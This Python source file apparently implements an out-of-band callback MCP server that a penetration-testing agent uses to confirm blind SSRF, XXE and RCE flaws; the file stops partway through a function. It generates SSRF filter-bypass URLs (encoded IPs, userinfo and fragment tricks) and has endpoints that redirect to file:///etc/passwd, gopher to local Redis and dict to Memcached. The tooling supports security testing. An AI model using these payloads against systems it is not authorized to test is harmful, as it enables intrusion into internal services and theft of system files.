#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OOB MCP —— ARTEX 带外回连验证 MCP 服务器（纯 Python 标准库实现）

用途
----
给 agent 一套"发出去、等回来"的闭环能力，用来无损验证只能靠带外信号确认的漏洞：
SSRF、XXE、盲 RCE、盲 SQLi、SSTI、反序列化、Fastjson/JNDI、PDF/图片渲染器出网等。

为什么不用 interactsh
---------------------
本机无自有域名、53/UDP 未放行、80/443 已被占用，自建 interactsh 不可行；
接公共 OAST 集群（oast.pro）会把客户资产的回连数据送到第三方，交付场景不合规。
因此这里用「公网 IP + 端口 + 唯一 token」自建 HTTP 带外信道，数据全程不出本机。

设计要点
--------
1. 传输：MCP stdio，自适应「行分隔 JSON」与「Content-Length」两种帧（与 ARTEX 现有
   recon/nuclei/webshell MCP 一致）。stdout 只允许协议帧，日志一律写文件。
2. 收包：进程内 ThreadingHTTPServer 监听 OOB_PORTS；多实例并存时绑不上的实例自动
   降级为「只读库 + 等待」模式，不会互相抢端口。
3. 存储：SQLite（WAL），路径 OOB_DB。命中先落库再让 wait 返回，重启 MCP 不丢数据。
4. 信噪比：只有带 token 的请求才算「业务命中」入库；扫描器噪音只计数不入库。
5. 容量保护：单条 body 上限 64KB、单会话命中上限 500 条、默认保留 7 天。
   本机磁盘长期 80%，这几条是硬约束，不要放开。
"""

import json
import os
import random
import re
import socket
import sqlite3
import struct
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---------------------------------------------------------------------------
# 配置加载：环境变量 > oob.conf > 内置默认
# ---------------------------------------------------------------------------

CONF_PATH = os.environ.get("OOB_CONF") or "/opt/artex/data/oob/oob.conf"


def load_conf(path):
    """读 key=value 配置，只填环境里没有的键（环境变量优先级最高）。

    ARTEX 拉起 MCP 时环境里没有 HOME、也不方便改 artex.env（改 env 要重启主服务），
    所以把 PUBLIC_HOST 这类部署相关配置放独立文件，改完下次调用即生效。
    """
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, v = line.partition("=")
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if k and v and k not in os.environ:
                    os.environ[k] = v
    except FileNotFoundError:
        pass
    except Exception:
        pass


load_conf(CONF_PATH)

SERVER_NAME = "OOB"
SERVER_VERSION = "1.0.0"

LOG_PATH = os.environ.get("OOB_LOG", "/var/log/oob-mcp.log")
DB_PATH = os.environ.get("OOB_DB", "/opt/artex/data/oob/oob.db")

# 回连监听端口。默认取已放行且空闲的端口；可用 OOB_PORTS 覆盖（逗号分隔）
DEFAULT_PORTS = "8889,18666,18667"
PORTS = []
for _p in (os.environ.get("OOB_PORTS") or DEFAULT_PORTS).split(","):
    _p = _p.strip()
    if _p.isdigit() and 0 < int(_p) < 65536:
        PORTS.append(int(_p))
if not PORTS:
    PORTS = [8889]

# 对外公布的回连主机；留空则自动探测本机出口地址
PUBLIC_HOST = (os.environ.get("OOB_PUBLIC_HOST") or "").strip()

# 额外可用于载荷的泛解析域名后缀（这些域名的 A 记录就是本机 IP，无需自有域名）
WILDCARD_SUFFIXES = ["nip.io", "sslip.io"]

MAX_BODY = 64 * 1024            # 单条请求体上限
MAX_HEADERS = 60                # 单条请求最多记多少个头
MAX_HITS_PER_SESSION = 500      # 单会话命中上限，超出丢弃并计数
DEFAULT_WAIT = 60               # oob_wait 默认等待秒数
MAX_WAIT = 300


def _env_int(name, default, low=0):
    """读整型配置。填错了就用默认值——监听器不能因为一个拼写错误起不来。"""
    try:
        v = int(os.environ.get(name) or default)
    except (TypeError, ValueError):
        log_once_bad_env(name, default)
        return default
    return v if v >= low else default


def log_once_bad_env(name, default):
    # log() 还没定义，这里直接 stderr 打一行，不阻塞启动
    sys.stderr.write("[oob] 环境变量 %s 值非法，回退为 %s\n" % (name, default))


RETENTION_DAYS = _env_int("OOB_RETENTION_DAYS", 7)
RECORD_NOISE_COUNT = _env_int("OOB_RECORD_NOISE", 0)

SUPPORTED_PROTOCOLS = ("2024-11-05", "2025-03-26", "2025-06-18", "2025-11-25")
DEFAULT_PROTOCOL = "2025-06-18"

ERR_PARSE = -32700
ERR_INVALID_REQUEST = -32600
ERR_METHOD_NOT_FOUND = -32601
ERR_INVALID_PARAMS = -32602
ERR_INTERNAL = -32603

_log_lock = threading.Lock()


def log(msg):
    """运行日志写文件；写失败也不能影响主流程。"""
    line = "%s [%d] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), os.getpid(), msg)
    try:
        with _log_lock:
            d = os.path.dirname(LOG_PATH)
            if d:
                os.makedirs(d, exist_ok=True)
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(line)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# stdio 帧读写：自适应「行分隔 JSON」与「Content-Length + JSON」
# ---------------------------------------------------------------------------

class FramedReader:
    def __init__(self, stream):
        self.stream = stream
        self.mode = None

    def read_message(self):
        if self.mode == "line":
            return self._read_line()
        if self.mode == "header":
            return self._read_header_frame()
        return self._detect_and_read()

    def _read_line(self):
        while True:
            raw = self.stream.readline()
            if not raw:
                return None
            if raw.strip():
                return raw.decode("utf-8", "replace")

    def _detect_and_read(self):
        while True:
            raw = self.stream.readline()
            if not raw:
                return None
            stripped = raw.strip()
            if not stripped:
                continue
            if stripped.lower().startswith(b"content-length:"):
                self.mode = "header"
                log("帧格式判定: Content-Length 头模式")
                return self._read_header_frame(first_header=stripped)
            self.mode = "line"
            log("帧格式判定: 行分隔 JSON 模式")
            return raw.decode("utf-8", "replace")

    def _read_header_frame(self, first_header=None):
        length = None
        pending = first_header
        while True:
            if pending is not None:
                raw, pending = pending, None
            else:
                raw = self.stream.readline()
                if not raw:
                    return None
            stripped = raw.strip()
            if not stripped:
                if length is None:
                    continue
                break
            if stripped.lower().startswith(b"content-length:"):
                try:
                    length = int(stripped.split(b":", 1)[1].strip())
                except Exception:
                    length = None
        if not length or length <= 0:
            return ""
        buf = b""
        while len(buf) < length:
            chunk = self.stream.read(length - len(buf))
            if not chunk:
                break
            buf += chunk
        return buf.decode("utf-8", "replace")


class FramedWriter:
    def __init__(self, stream):
        self.stream = stream
        self.mode = "line"

    def sync(self, mode):
        if mode:
            self.mode = mode

    def send(self, obj):
        data = json.dumps(obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
        if self.mode == "header":
            frame = b"Content-Length: %d\r\n\r\n" % len(data) + data
        else:
            frame = data + b"\n"
        try:
            self.stream.write(frame)
            self.stream.flush()
        except (BrokenPipeError, ValueError):
            raise SystemExit(0)


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------

class ToolError(Exception):
    """工具执行失败，消息会原样返回给 agent。"""


def clamp(v, lo, hi):
    return max(lo, min(hi, v))


def as_int(value, default, lo, hi):
    try:
        n = int(value)
    except (TypeError, ValueError):
        try:
            n = int(float(value))
        except (TypeError, ValueError):
            n = default
    return clamp(n, lo, hi)


def as_bool(value, default):
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    s = str(value).strip().lower()
    if s in ("1", "true", "yes", "y", "on"):
        return True
    if s in ("0", "false", "no", "n", "off"):
        return False
    return default


def brief(text, limit=600):
    s = "" if text is None else str(text)
    s = s.replace("\r", "")
    if len(s) <= limit:
        return s
    return s[:limit] + "…(%d 字)" % len(s)


def now_ts():
    return time.time()


def port_alive(port, host="127.0.0.1", timeout=1.0):
    """本机端口是否有人接——用于判断收包是否由常驻监听器接管。"""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def fmt_ts(ts):
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts))


def detect_public_host():
    """探测本机对外地址：UDP connect 不实际发包，拿到的就是出口网卡地址。"""
    if PUBLIC_HOST:
        return PUBLIC_HOST
    for probe in (("8.8.8.8", 53), ("114.114.114.114", 53)):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(probe)
                return s.getsockname()[0]
            finally:
                s.close()
        except Exception:
            continue
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "127.0.0.1"


def ip_variants(ip):
    """生成同一 IP 的多种书写形式，用于绕过只做字符串匹配的弱校验。"""
    out = {"dotted": ip}
    try:
        packed = socket.inet_aton(ip)
    except OSError:
        return out
    dec = struct.unpack("!I", packed)[0]
    out["decimal"] = str(dec)
    out["hex"] = "0x%08x" % dec
    out["octal_dotted"] = ".".join("0%o" % b for b in packed)
    out["hex_dotted"] = ".".join("0x%02x" % b for b in packed)
    out["ipv6_mapped"] = "::ffff:%02x%02x:%02x%02x" % tuple(packed)
    return out


def is_private_ip(ip):
    try:
        parts = [int(x) for x in ip.split(".")]
    except Exception:
        return False
    if len(parts) != 4:
        return False
    a, b = parts[0], parts[1]
    if a == 10:
        return True
    if a == 172 and 16 <= b <= 31:
        return True
    if a == 192 and b == 168:
        return True
    if a == 127:
        return True
    if a == 169 and b == 254:
        return True
    if a == 100 and 64 <= b <= 127:
        return True
    return False


# ---------------------------------------------------------------------------
# 存储层
# ---------------------------------------------------------------------------

def db():
    d = os.path.dirname(DB_PATH)
    if d:
        os.makedirs(d, exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    try:
        conn.execute("PRAGMA journal_mode=WAL")
    except Exception:
        pass
    return conn


SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions (
    id          TEXT PRIMARY KEY,
    token       TEXT NOT NULL,
    label       TEXT,
    note        TEXT,
    created_at  REAL NOT NULL,
    closed_at   REAL,
    extra_hosts TEXT
);
CREATE TABLE IF NOT EXISTS hits (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id  TEXT NOT NULL,
    token       TEXT NOT NULL,
    variant     TEXT,
    ts          REAL NOT NULL,
    method      TEXT,
    scheme      TEXT,
    host        TEXT,
    path        TEXT,
    query       TEXT,
    remote_ip   TEXT,
    remote_port INTEGER,
    ua          TEXT,
    headers     TEXT,
    body        TEXT,
    body_len    INTEGER,
    truncated   INTEGER DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_hits_session ON hits(session_id, id);
CREATE INDEX IF NOT EXISTS idx_hits_ts ON hits(ts);
"""

_init_lock = threading.Lock()
_inited = False


def init_db():
    global _inited
    with _init_lock:
        if _inited:
            return
        conn = db()
        try:
            conn.executescript(SCHEMA)
            conn.commit()
        finally:
            conn.close()
        _inited = True
        log("数据库就绪: %s" % DB_PATH)


def new_token():
    return "".join(random.choice("0123456789abcdef") for _ in range(32))


def new_session_id():
    return "s" + "".join(random.choice("0123456789abcdef") for _ in range(7))


# ---------------------------------------------------------------------------
# 收包：HTTP 监听器
# ---------------------------------------------------------------------------

TOKEN_PATH_RE = re.compile(r"^/t/([0-9a-f]{8,64})(?:/([A-Za-z0-9_\-]{0,32}))?")

_listener_state = {
    "ports": [],        # 本进程成功绑定的端口
    "failed": [],       # 绑定失败的端口
    "noise": 0,         # 未带 token 的请求计数
    "total": 0,
    "started_at": None,
}


def record_hit(session_id, token, variant, method, host, path, query,
               remote_ip, remote_port, ua, headers, body, truncated):
    """写一条命中；超限或异常都不得影响收包。"""
    try:
        conn = db()
        try:
            cnt = conn.execute(
                "SELECT COUNT(*) FROM hits WHERE session_id=?", (session_id,)
            ).fetchone()[0]
            if cnt >= MAX_HITS_PER_SESSION:
                return
            conn.execute(
                "INSERT INTO hits(session_id,token,variant,ts,method,scheme,host,path,"
                "query,remote_ip,remote_port,ua,headers,body,body_len,truncated) "
                "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (session_id, token, variant, now_ts(), method, "http", host, path,
                 query, remote_ip, remote_port, ua, headers, body,
                 len(body or ""), 1 if truncated else 0),
            )
            conn.commit()
        finally:
            conn.close()
    except Exception as e:
        log("写命中失败: %s: %s" % (type(e).__name__, e))


class OobHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "oob/1.0"

    def log_message(self, *a):
        pass

    def _collect(self):
        try:
            _listener_state["total"] += 1
            path, _, query = (self.path or "/").partition("?")
            qs = urllib.parse.parse_qs(query or "")

            # token 识别：路径 /t/<token>[/variant] 最优，其次 query，再次子域前缀
            token = None
            variant = None
            m = TOKEN_PATH_RE.match(path or "")
            if m:
                token = m.group(1)
                variant = m.group(2) or None
            if not token:
                for key in ("t", "token", "id"):
                    if qs.get(key):
                        cand = (qs[key][0] or "").strip()
                        if re.match(r"^[0-9a-f]{8,64}$", cand):
                            token = cand
                            break
            host_hdr = (self.headers.get("Host") or "").split(":")[0]
            if not token and host_hdr:
                first = host_hdr.split(".")[0] or ""
                if re.match(r"^[0-9a-f]{32}$", first):
                    token = first
            if not variant:
                for key in ("v", "tag", "variant"):
                    if qs.get(key):
                        variant = (qs[key][0] or "")[:32]
                        break

            # 读 body（超限即停止读取，避免被打爆磁盘）
            body = b""
            truncated = False
            try:
                cl = int(self.headers.get("Content-Length") or 0)
            except Exception:
                cl = 0
            if cl > 0:
                want = min(cl, MAX_BODY)
                try:
                    body = self.rfile.read(want)
                except Exception:
                    body = b""
                if cl > MAX_BODY:
                    truncated = True

            try:
                body_text = body.decode("utf-8", "replace")
            except Exception:
                body_text = repr(body[:2000])

            hdrs = {}
            try:
                for i, (k, v) in enumerate(self.headers.items()):
                    if i >= MAX_HEADERS:
                        break
                    hdrs[k] = v
            except Exception:
                pass

            if not token:
                _listener_state["noise"] += 1
                if RECORD_NOISE_COUNT:
                    log("噪音(无token): %s %s from %s UA=%s" % (
                        self.command, self.path, self.client_address[0],
                        brief(self.headers.get("User-Agent"), 80)))
                return

            # token 必须存在于会话表，否则按噪音计（防止扫描器随机路径刷库）
            conn = db()
            try:
                row = conn.execute(
                    "SELECT id FROM sessions WHERE token=? AND closed_at IS NULL", (token,)
                ).fetchone()
            finally:
                conn.close()
            if not row:
                _listener_state["noise"] += 1
                return

            record_hit(
                session_id=row["id"], token=token, variant=variant,
                method=self.command, host=self.headers.get("Host") or "",
                path=path, query=query,
                remote_ip=self.client_address[0], remote_port=self.client_address[1],
                ua=self.headers.get("User-Agent") or "",
                headers=json.dumps(hdrs, ensure_ascii=False),
                body=body_text, truncated=truncated,
            )
            log("命中 session=%s token=%s %s %s variant=%s from %s" % (
                row["id"], token[:8], self.command, brief(path, 80),
                variant, self.client_address[0]))
        except Exception as e:
            log("处理请求异常: %s: %s" % (type(e).__name__, e))

    def _redirect(self, location, code=302):
        try:
            self.send_response(code)
            self.send_header("Location", location)
            self.send_header("Content-Length", "0")
            self.send_header("Connection", "close")
            self.end_headers()
        except Exception:
            pass

    def _respond_cap(self, token, step):
        """能力探测端点：靠 302 链把回连方的行为特征自动逼出来，无需人工多次注入。

        cap_a1 → cap_a2 → cap_a3(401) → cap_a4(1MB)
        目标跟着走，就能观测到：是否跟随重定向、是否链式跟随、是否处理认证、是否接受大响应。
        """
        base = "/t/%s/cap_" % token
        try:
            if step == "a1":
                self._redirect(base + "a2")
            elif step == "a2":
                self._redirect(base + "a3")
            elif step == "a3":
                if self.headers.get("Authorization"):
                    self._redirect(base + "a4")
                else:
                    body = b"auth required"
                    self.send_response(401)
                    self.send_header("WWW-Authenticate", 'Basic realm="oob"')
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.send_header("Connection", "close")
                    self.end_headers()
                    if self.command != "HEAD":
                        self.wfile.write(body)
            elif step == "a4":
                # 1MB 响应：观察对端是否愿意/能够整段接收
                body = b"A" * (1024 * 1024)
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Connection", "close")
                self.end_headers()
                if self.command != "HEAD":
                    try:
                        self.wfile.write(body)
                        self.wfile.flush()
                    except Exception:
                        pass
            elif step == "file":
                # 跨协议跃迁测试：file:// 不会回连，收不到属正常，需回显通道确认效果
                self._redirect("file:///etc/passwd")
            elif step == "gopher":
                self._redirect("gopher://127.0.0.1:6379/_PING")
            elif step == "dict":
                self._redirect("dict://127.0.0.1:11211/stats")
            else:
                self._redirect(base + "a1")
        except Exception as e:
            log("能力探测响应异常 step=%s: %s" % (step, e))

    def _respond(self):
        path = (self.path or "/").partition("?")[0]
        m = re.match(r"^/t/([0-9a-f]{8,64})/cap_(a[0-9]|file|gopher|dict)$", path)
        if m:
            self._respond_cap(m.group(1), m.group(2))
            return
        try:
            payload = b"oob-ok"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(payload)))
            self.send_header("Connection", "close")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(payload)
        except Exception:
            pass

    def _handle(self):
        self._collect()
        self._respond()

    do_GET = _handle
    do_POST = _handle
    do_HEAD = _handle
    do_PUT = _handle
    do_DELETE = _handle
    do_PATCH = _handle
    do_OPTIONS = _handle
    do_TRACE = _handle
    do_CONNECT = _handle


class OobServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def listener_ports():
    """返回 (端口列表, 提供方描述)。

    MCP 实例通常抢不到端口（已被 oob-listen.service 常驻占用），此时会降级为只读。
    降级不代表信道坏了——收包由常驻监听器负责，工具照常可用。这里必须如实区分，
    否则 agent 看到「无监听端口」会误判成带外信道失效。
    """
    if _listener_state["ports"]:
        return _listener_state["ports"], "本进程"
    alive = [p for p in PORTS if port_alive(p)]
    if alive:
        return alive, "常驻监听器 oob-listen"
    return [], "无"


def _bind_port(port):
    """尝试绑定一个端口，成功则起线程并登记。"""
    try:
        srv = OobServer(("0.0.0.0", port), OobHandler)
    except OSError as e:
        return e
    t = threading.Thread(target=srv.serve_forever, name="oob-%d" % port, daemon=True)
    t.start()
    _listener_state["ports"].append(port)
    log("监听已启动: 0.0.0.0:%d" % port)
    return None


def _reclaim_loop():
    """端口接管线程。

    多实例并存时，后启动的实例往往抢不到端口（前一个实例还占着），只能降级为只读。
    但前一个实例随其 worker 回收后端口会空出来 —— 如果没有这个循环，本进程就会
    永远停在「只读」状态，导致整个带外信道静默失效（已踩过一次）。
    """
    while True:
        time.sleep(15)
        failed = list(_listener_state["failed"])
        if not failed:
            continue
        still = []
        for port, _ in failed:
            err = _bind_port(port)
            if err is not None:
                if getattr(err, "errno", None) != 98:   # 98=EADDRINUSE，继续等
                    log("接管端口 %d 失败: %s" % (port, err))
                still.append((port, str(err)))
            else:
                log("已接管端口 %d（原占用者退出）" % port)
        _listener_state["failed"] = still


def start_listeners():
    """尽力绑定所有配置端口；已被同机其他实例占用则跳过，交给接管线程稍后重试。"""
    init_db()
    for port in PORTS:
        err = _bind_port(port)
        if err is not None:
            _listener_state["failed"].append((port, str(err)))
            log("端口 %d 绑定失败（可能被其他 MCP 实例占用）: %s" % (port, err))
    _listener_state["started_at"] = now_ts()
    threading.Thread(target=_reclaim_loop, name="oob-reclaim", daemon=True).start()
    # 清理过期数据
    try:
        conn = db()
        try:
            cutoff = now_ts() - RETENTION_DAYS * 86400
            n = conn.execute("DELETE FROM hits WHERE ts < ?", (cutoff,)).rowcount
            conn.execute("DELETE FROM sessions WHERE closed_at IS NOT NULL AND closed_at < ?",
                         (cutoff,))
            conn.commit()
            if n:
                log("清理过期命中 %d 条" % n)
        finally:
            conn.close()
    except Exception as e:
        log("清理过期数据失败: %s" % e)


# ---------------------------------------------------------------------------
# 载荷生成
# ---------------------------------------------------------------------------

def build_payloads(token, ports=None, extra_hosts=None, variant_set="full"):
    """
    生成同一 token 的一组回连载荷。每个变体带独立 tag，命中后能反查是哪个变体穿过去的。
    """
    host_base = detect_public_host()
    if not ports:
        _lp, _ = listener_ports()
        ports = _lp or PORTS
    port = ports[0] if ports else PORTS[0]
    items = []

    def add(name, url, note=""):
        tag = name.replace(" ", "_").replace("/", "-")[:24]
        items.append({
            "variant": name,
            "tag": tag,
            "url": url,
            "callback_url": url.replace("/t/%s" % token, "/t/%s/%s" % (token, tag)),
            "note": note,
        })

    deadline = "/t/%s" % token
    # 每个监听端口都出一条 baseline。监听器开多端口就是为了应对「目标只放行特定出站端口」，
    # 只给第一个端口等于其余端口白开。第一个端口沿用原名 baseline，不影响已按 variant 匹配的调用方。
    for _i, _p in enumerate(ports or PORTS):
        if _i == 0:
            add("baseline", "http://%s:%d%s" % (host_base, _p, deadline), "标准点分十进制 IP")
        else:
            add("baseline_%d" % _p, "http://%s:%d%s" % (host_base, _p, deadline),
                "备选端口 %d：目标只放行这个出站端口时用" % _p)

    if variant_set in ("full", "bypass"):
        v = ip_variants(host_base)
        if v.get("decimal"):
            add("decimal_ip", "http://%s:%d%s" % (v["decimal"], port, deadline),
                "整数形式 IP，绕过点分十进制黑名单")
        if v.get("hex"):
            add("hex_ip", "http://%s:%d%s" % (v["hex"], port, deadline),
                "十六进制 IP")
        if v.get("octal_dotted"):
            add("octal_ip", "http://%s:%d%s" % (v["octal_dotted"], port, deadline),
                "八进制点分 IP")
        if v.get("hex_dotted"):
            add("hex_dotted_ip", "http://%s:%d%s" % (v["hex_dotted"], port, deadline),
                "十六进制点分 IP")
        if v.get("ipv6_mapped"):
            add("ipv6_mapped", "http://[%s]:%d%s" % (v["ipv6_mapped"], port, deadline),
                "IPv6 映射地址")
        add("no_scheme", "%s:%d%s" % (host_base, port, deadline),
            "不带协议头，用于参数被拼进 URL 的场景")
        add("double_slash", "//%s:%d%s" % (host_base, port, deadline),
            "协议相对 URL")
        add("userinfo_bypass", "http://127.0.0.1@%s:%d%s" % (host_base, port, deadline),
            "userinfo 混淆：host 前插 127.0.0.1@，绕过只匹配 host 的弱校验")
        add("fragment_bypass", "http://%s:%d%s#@127.0.0.1" % (host_base, port, deadline),
            "片段符截断，绕过后缀匹配")
        add("query_bypass", "http://%s:%d%s?@127.0.0.1" % (host_base, port, deadline),
            "查询符截断")
        for suf in WILDCARD_SUFFIXES:
            add("wildcard_%s" % suf.replace(".", "_"),
                "http://%s.%s:%d%s" % (host_base, suf, port, deadline),
                "泛解析域名 %s，A 记录指向本机" % suf)

    for extra in (extra_hosts or []):
        extra = (extra or "").strip()
        if not extra:
            continue
        if "://" not in extra:
            extra = "http://" + extra
        base = extra.rstrip("/")
        add("custom:%s" % brief(base, 20), "%s%s" % (base, deadline), "自定义回连主机")

    return items


def render_payload_text(session, items, wait_hint=True):
    lines = []
    lines.append("会话 %s（标签 %s）已就绪，token=%s" % (
        session["id"], session.get("label") or "-", session["token"]))
    lines.append("监听端口: %s" % ", ".join(str(p) for p in (_listener_state["ports"] or PORTS)))
    host = detect_public_host()
    if is_private_ip(host):
        lines.append("")
        lines.append("⚠ 回连主机探测到内网地址 %s，但本机公网 IP 是 NAT 映射，目标从公网连不到。" % host)
        lines.append("  请先在 %s 写入 OOB_PUBLIC_HOST=<本机公网IP>，再重建会话。" % CONF_PATH)
    lines.append("")
    lines.append("载荷（每个变体 tag 不同，命中后可从 path 第三段反查）:")
    for it in items:
        lines.append("- %-16s %s" % (it["variant"], it["callback_url"]))
        if it["note"]:
            lines.append("  └ %s" % it["note"])
    if wait_hint:
        lines.append("")
        lines.append("把载荷注入目标参数后，立即调用 oob_wait(session_id=\"%s\") 等待回连。" % session["id"])
        lines.append("未回连不代表不存在漏洞（可能目标不出网/被拦），可换变体或改用内网探测手法再审。")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# 工具实现
# ---------------------------------------------------------------------------

def tool_new_session(args):
    label = str(args.get("label") or "").strip()[:64]
    note = str(args.get("note") or "").strip()[:200]
    extra = args.get("extra_hosts")
    if isinstance(extra, str):
        extra = [x.strip() for x in re.split(r"[,\n]", extra) if x.strip()]
    if not isinstance(extra, list):
        extra = []
    extra = [str(x)[:100] for x in extra][:5]

    init_db()
    sid = new_session_id()
    token = new_token()
    conn = db()
    try:
        conn.execute(
            "INSERT INTO sessions(id,token,label,note,created_at,extra_hosts) VALUES (?,?,?,?,?,?)",
            (sid, token, label or None, note or None, now_ts(), json.dumps(extra)),
        )
        conn.commit()
    finally:
        conn.close()

    session = {"id": sid, "token": token, "label": label}
    items = build_payloads(token, extra_hosts=extra)
    log("新建会话 %s label=%s" % (sid, label or "-"))
    return render_payload_text(session, items), False


def tool_payloads(args):
    sid = str(args.get("session_id") or "").strip()
    if not sid:
        raise ToolError("缺少 session_id，请先调用 oob_new_session")
    init_db()
    conn = db()
    try:
        row = conn.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
    finally:
        conn.close()
    if not row:
        raise ToolError("会话 %s 不存在" % sid)

    variant_set = str(args.get("variant_set") or "full").strip().lower()
    if variant_set not in ("full", "bypass", "minimal"):
        variant_set = "full"
    extra = []
    try:
        extra = json.loads(row["extra_hosts"] or "[]")
    except Exception:
        extra = []
    items = build_payloads(row["token"], extra_hosts=extra, variant_set=variant_set)
    if variant_set == "minimal":
        items = items[:1]
    return render_payload_text({"id": row["id"], "token": row["token"],
                                "label": row["label"]}, items), False


def _hit_row_to_line(r):
    return "  [%d] %s %s %s  ← %s%s" % (
        r["id"], fmt_ts(r["ts"]), r["method"], brief(r["path"], 60),
        r["remote_ip"], (" / " + r["variant"]) if r["variant"] else "")


def tool_wait(args):
    sid = str(args.get("session_id") or "").strip()
    if not sid:
        raise ToolError("缺少 session_id")
    timeout = as_int(args.get("timeout"), DEFAULT_WAIT, 1, MAX_WAIT)
    after_id = as_int(args.get("after_hit_id"), 0, 0, 2 ** 31)
    init_db()
    conn = db()
    try:
        sess = conn.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
        if not sess:
            raise ToolError("会话 %s 不存在" % sid)
        base = conn.execute(
            "SELECT COUNT(*) FROM hits WHERE session_id=?", (sid,)
        ).fetchone()[0]
    finally:
        conn.close()

    deadline = now_ts() + timeout
    while True:
        conn = db()
        try:
            rows = conn.execute(
                "SELECT * FROM hits WHERE session_id=? AND id>? ORDER BY id LIMIT 20",
                (sid, after_id),
            ).fetchall()
        finally:
            conn.close()
        if rows:
            lines = ["✅ 收到回连：%d 条命中（会话 %s）" % (len(rows), sid), ""]
            for r in rows:
                lines.append("命中 #%d" % r["id"])
                lines.append("  时间      : %s" % fmt_ts(r["ts"]))
                lines.append("  请求      : %s %s%s" % (
                    r["method"], r["path"], ("?" + r["query"]) if r["query"] else ""))
                lines.append("  Host      : %s" % (r["host"] or "-"))
                lines.append("  来源 IP   : %s:%s" % (r["remote_ip"], r["remote_port"]))
                lines.append("  UA        : %s" % brief(r["ua"], 120))
                if r["variant"]:
                    lines.append("  命中变体  : %s" % r["variant"])
                if r["body_len"]:
                    lines.append("  请求体    : %s" % brief(r["body"], 200))
                lines.append("")
            lines.append("判定要点:")
            rip = rows[0]["remote_ip"] or ""
            if is_private_ip(rip):
                lines.append("- 来源 IP 属于内网段，说明请求由目标所在内网的主机代发（典型的 SSRF 内网穿透）。")
            else:
                lines.append("- 来源 IP 为 %s，请与目标出口 IP 比对，确认是本目标发起的。" % rip)
            tag = rows[0]["variant"]
            if tag and tag != "baseline":
                lines.append("- 穿透的是 %s 变体，说明目标该处的 IP/协议校验存在绕过空间。" % tag)
            lines.append("- 结论：带外信道已确证目标可向外发起请求。如命中内容含内网探测结果，可直接升级为 SSRF 定级。")
            return "\n".join(lines), False

        if now_ts() >= deadline:
            conn = db()
            try:
                total = conn.execute(
                    "SELECT COUNT(*) FROM hits WHERE session_id=?", (sid,)
                ).fetchone()[0]
            finally:
                conn.close()
            lines = [
                "⏳ 等待 %ds 未收到回连（会话 %s，等待前已有 %d 条命中，当前共 %d 条）。" % (
                    timeout, sid, base, total),
                "",
                "这不等于漏洞不存在，常见原因：",
                "1. 目标不出网 / 出网被防火墙或代理拦截；",
                "2. 目标只做 DNS 解析不发 HTTP（本信道看不到，需改用 DNS 型回连）；",
                "3. 载荷被 WAF 或参数校验拦下 —— 换 oob_payloads 里的其他变体重试；",
                "4. 请求是异步的（队列/定时任务/回调），需要更长时间：调大 timeout 再来一次。",
                "",
                "可继续：oob_payloads(session_id=\"%s\") 取更多绕过变体，或 oob_hits 查看已有命中。" % sid,
            ]
            return "\n".join(lines), False

        time.sleep(0.25)


def tool_hits(args):
    sid = str(args.get("session_id") or "").strip()
    limit = as_int(args.get("limit"), 30, 1, 200)
    init_db()
    conn = db()
    try:
        if sid:
            rows = conn.execute(
                "SELECT * FROM hits WHERE session_id=? ORDER BY id DESC LIMIT ?", (sid, limit)
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM hits ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
    finally:
        conn.close()
    if not rows:
        return "暂无命中。", False
    lines = ["最近 %d 条命中：" % len(rows), ""]
    for r in rows:
        lines.append(_hit_row_to_line(r))
    lines.append("")
    lines.append("查看单条完整请求头/请求体：oob_hit_detail(hit_id=N)")
    return "\n".join(lines), False


def tool_hit_detail(args):
    hid = as_int(args.get("hit_id"), 0, 0, 2 ** 31)
    if not hid:
        raise ToolError("缺少 hit_id")
    init_db()
    conn = db()
    try:
        r = conn.execute("SELECT * FROM hits WHERE id=?", (hid,)).fetchone()
    finally:
        conn.close()
    if not r:
        raise ToolError("命中 #%d 不存在" % hid)
    lines = [
        "命中 #%d（会话 %s）" % (r["id"], r["session_id"]),
        "时间      : %s" % fmt_ts(r["ts"]),
        "请求行    : %s %s%s HTTP/1.1" % (
            r["method"], r["path"], ("?" + r["query"]) if r["query"] else ""),
        "Host      : %s" % (r["host"] or "-"),
        "来源      : %s:%s" % (r["remote_ip"], r["remote_port"]),
        "变体      : %s" % (r["variant"] or "-"),
        "",
        "请求头:",
    ]
    try:
        hdrs = json.loads(r["headers"] or "{}")
        for k, v in hdrs.items():
            lines.append("  %s: %s" % (k, v))
